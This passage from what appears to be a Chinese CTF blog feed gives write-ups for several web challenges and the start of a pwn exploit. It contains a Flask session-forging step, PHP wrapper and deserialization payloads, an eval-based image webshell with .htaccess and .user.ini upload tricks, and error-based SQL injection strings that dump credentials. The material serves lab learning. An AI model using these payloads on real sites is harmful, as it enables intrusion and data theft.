src="https://tuchuangs.com/imgs/2022/11/19/cbe25ec4166ed039.png"></p><p>在源码中发现只要账号的session是admin后就会打印出flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">{% include('header.html') %}</span><br><span class="line">{% if current_user.is_authenticated %}</span><br><span class="line">&lt;h1 class="nav"&gt;Hello {{ session['name'] }}&lt;/h1&gt;</span><br><span class="line">{% endif %}</span><br><span class="line">{% if current_user.is_authenticated and session['name'] == 'admin' %}</span><br><span class="line">&lt;h1 class="nav"&gt;hctf{xxxxxxxxx}&lt;/h1&gt;</span><br><span class="line">{% endif %}</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class="nav"&gt;Welcome to hctf&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">{% include('footer.html') %}</span><br></pre></td></tr></tbody></table></figure><p>先用解密脚本跑一下自己注册的账号的session</p><p>解密脚本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b'.', 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b'.', 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b'.'):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception('Could not base64 decode the payload because of '</span><br><span class="line">                         'an exception')</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception('Could not zlib decompress the payload before '</span><br><span class="line">                             'decoding the payload')</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    print(decryption(sys.argv[1].encode()))youlin@youlin-virtual-machine:~/web$ cat session.py </span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b'.', 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b'.', 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b'.'):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception('Could not base64 decode the payload because of '</span><br><span class="line">                         'an exception')</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception('Could not zlib decompress the payload before '</span><br><span class="line">                             'decoding the payload')</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></tbody></table></figure><img src="https://tuchuangs.com/imgs/2022/11/19/48b124f7f04c1bc0.png"><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">youlin@youlin-virtual-machine:~/web$ python session.py .eJw9UEuLwjAQ_ivLnD3UPi6CB6GutDAjW1JDchFta5vEKlSlNOJ_31kXPAwMfPO95gn709DcOljch0czg72pYfGEryMsAK2blG1j9DxpO0dfTVuBAW5yp3zlUaiY-tyiX0WUulj52pDI_FZ0vbJlTF5FZFuPPYbblKyW-qzketRWd1pUI4ky1iILSWCEYdGpcMf82ihfOJQle-4ceQxRFB3KnVXCMTebK_mTkC0MZ0pQFnxfLeE1g-o2nPb3q2sunwoUZhNHi7T8NrwHxGExdQFarpHWlja5UfbPbp2g11yL7VbLt5zpD23zUarTfCzHf-Ry6BmA6fo4mwvM4HFrhvfjYB7A6xeCPG4Q.Y3iTyA.jV0tqYnpLbmzD9wE9Yh_AhC-BxI</span><br><span class="line">{'_fresh': True, '_id': b'292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7', 'csrf_token': b'7b2497eab7b463309423407c4bbb4d1a936dc360', 'image': b't2pS', 'name': 'youlin', 'user_id': '10'}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>可以看到只需要将自己注册的name的youlin改为admin之后就可以了</p><p>git clone 大佬给出的 flask session 加密py地址：<a href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a></p><p>在加密代码中 需要一个 secret_key 的值，这个值在 题目源码中 也可以找到，然后构造好自己的 session 再进行加密。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a90be6e676cd1d23accfe21ef9868cac.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7', 'csrf_token': b'7b2497eab7b463309423407c4bbb4d1a936dc360', 'image': b't2pS', 'name': 'admin', 'user_id': '10'}"</span><br></pre></td></tr></tbody></table></figure><p>就可以得到对应的session的内容，然后利用bp进行抓包修改session发送后就可以得到flag</p><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1668847091154.png" alt="1668847091154"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目就可以直接看到题目源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php&nbsp;&nbsp;</span><br><span class="line">$text&nbsp;=&nbsp;$_GET["text"];</span><br><span class="line">$file&nbsp;=&nbsp;$_GET["file"];</span><br><span class="line">$password&nbsp;=&nbsp;$_GET["password"];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome&nbsp;to&nbsp;the&nbsp;zjctf")){</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;if(preg_match("/flag/",$file)){</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"Not&nbsp;now!";</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit();&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include($file);&nbsp;&nbsp;//useless.php</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$password&nbsp;=&nbsp;unserialize($password);</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$password;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}</span><br><span class="line">}</span><br><span class="line">else{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;highlight_file(__FILE__);</span><br><span class="line">}</span><br><span class="line">?&gt; </span><br></pre></td></tr></tbody></table></figure><p>这道题考点：<strong>php伪协议</strong></p><p><img src="https://img-blog.csdnimg.cn/20201115161452915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>首先看第一个判断，text文件里面的内容等于”welcome to the zjctf”</p><p>通过data协议进行绕过，一般情况是需要base64加密的，为了绕过某些过滤</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></tbody></table></figure><p><strong>加上第二个绕过：（php://filter用于读取源码）</strong></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></tbody></table></figure><p>进行base64解码得到：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag{  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring(){  </span><br><span class="line">        if(isset($this-&gt;file)){  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo "&lt;br&gt;";</span><br><span class="line">        return ("U R SO CLOSE !///COME ON PLZ");</span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></tbody></table></figure><p><strong>第三个绕过：（反序列化）</strong></p><p>进行测试就可以了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag{  //flag.php  </span><br><span class="line">    public $file="flag.php";  </span><br><span class="line">    public function __tostring(){  </span><br><span class="line">        if(isset($this-&gt;file)){  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo "&lt;br&gt;";</span><br><span class="line">        return ("U R SO CLOSE !///COME ON PLZ");</span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line">$a = new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><br></pre></td></tr></tbody></table></figure><p>所以最终的payload:</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span></span><br></pre></td></tr></tbody></table></figure><p>flag:flag{cda1d469-1b5b-43aa-9cf2-28d1b99c5b20}</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一个很特别的文件上传界面</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202516147.png" alt="image-20221126202516147"></p><p>只可以上传图片，php,phtml等后缀都被过滤了，首先上传一个图片马1.png</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language="php"&gt;eval($_POST['cmd']);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>接着上传一个**.htaccess**文件</p><p>.htaccess是什么</p><p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><p>那么现在开始写一个.htaccess文件，里面的内容为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch "1.png"&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></tbody></table></figure><p>注意里面的1.png要和你刚才上传的文件名一样，接着上传，需要使用bp进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126202859568.png" alt="image-20221126202859568"></p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126203225566.png" alt="image-20221126203225566"></p><p>显示上传成功后就可以直接使用蚁剑链接了，flag在根目录</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221126204523224.png" alt="image-20221126204523224"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和之前几个sql注入题一样的界面，先用bp fuzz测试一下过滤了哪些词</p><p>参考：<a href="https://www.jianshu.com/p/a78a3232ffb3">利用burpsuit对xss和sql注入进行fuzz</a>（主要就是利用bp的intruder模块进行爆破，看长进行判断，响应为736都被过滤，响应为751的没有被过滤）</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225257899.png" alt="image-20221125225257899"></p><p>构造注入语句（在用户中输入的）<br> 1.查询数据库：</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'or(updatexml(1,concat(0x7e,database()),1))#</span></span><br></pre></td></tr></tbody></table></figure><p>爆出数据库名为geek</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225322290.png" alt="image-20221125225322290"></p><p>2.查询表名</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))#</span></span><br></pre></td></tr></tbody></table></figure><p>得到表名H4rDsq1</p><p>3.查字段名</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="string">'))),1))#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure><p>得到字段名为id,username,password</p><p>4.爆数据</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'or(updatexml(1,concat(0x7e,(select(group_concat(username,'</span><span class="operator">~</span><span class="string">',password))from(H4rDsq1))),1))#</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225645447.png" alt="image-20221125225645447"></p><p>数据库中第一条数据就是flag</p><p>flag没显示完,原因是报错内容最大字符数为32，后面的就不会再显示<br> 这样，我们可以使用left和right函数先查左边，再查右边，然后拼接在一起就能得到flag</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)where(username)like('</span>flag<span class="string">'))),1))#</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125225746019.png" alt="image-20221125225746019"></p><p>拼接后得到完整flag:</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入页面后直接给出了源码</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>])) {</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])) {</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            {</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 {</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 }</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 {</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先用数组绕过第一个md5值相等</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ae61c471-4bfb-4699-8e90-cc09b2a018d5.node4.buuoj.cn:81/?gg[]=1&amp;id[]=2</span><br></pre></td></tr></tbody></table></figure><p>接着用post方式给passwd传参</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_numeric — 检测变量是否为数字或数字字符串，如果 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</span><br></pre></td></tr></tbody></table></figure><p>用1234567a使得返回false，直接得到flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>一个文件上传，也是将php,phtml等后缀过滤了，首先上传一个图片马，shell.jpg</p><p>接着上传一个 <strong>.user.ini</strong> 文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># .xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件</span><br><span class="line"># 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line"># 如果是 Apache 服务器，则可以利用 .htaccess 文件，作用和 .INI 一样，只是风格上有些不一样</span><br></pre></td></tr></tbody></table></figure><p>接着蚁剑直接链接，flag在根目录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Easy-MD5&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Easy-MD5&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Easy MD5&quot;&gt;&lt;/a&gt;[BJDCTF2020]Easy MD5&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>祥云杯复现</title>
    <link href="http://wscyoulin.github.io/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://wscyoulin.github.io/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-11-06T08:29:43.000Z</published>
    <updated>2022-11-06T08:39:39.140Z</updated>
    
    <content type="html"><![CDATA[<h3 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h3><p>爆破onegadget</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def pwn(io):</span><br><span class="line">    payload='a'*0x18+'\xd1'</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    payload='a'*0x18+'\x02\x33\x9f'</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line"></span><br><span class="line">count=1</span><br><span class="line">while(1):</span><br><span class="line">        io=process("./unexploitable")</span><br><span class="line">        pwn(io)</span><br><span class="line">        print(count)</span><br><span class="line">        count += 1</span><br><span class="line">        try:    </span><br><span class="line">                io.recv(timeout=0.2)</span><br><span class="line">                io.recv(timeout=0.2)</span><br><span class="line">        except:</span><br><span class="line">                io.close()</span><br><span class="line">                continue</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>（具体能不能成功不是很清楚，因为本地把地址随机化关了）</p><h3 id="Sandboxheap"><a href="#Sandboxheap" class="headerlink" title="Sandboxheap"></a>Sandboxheap</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 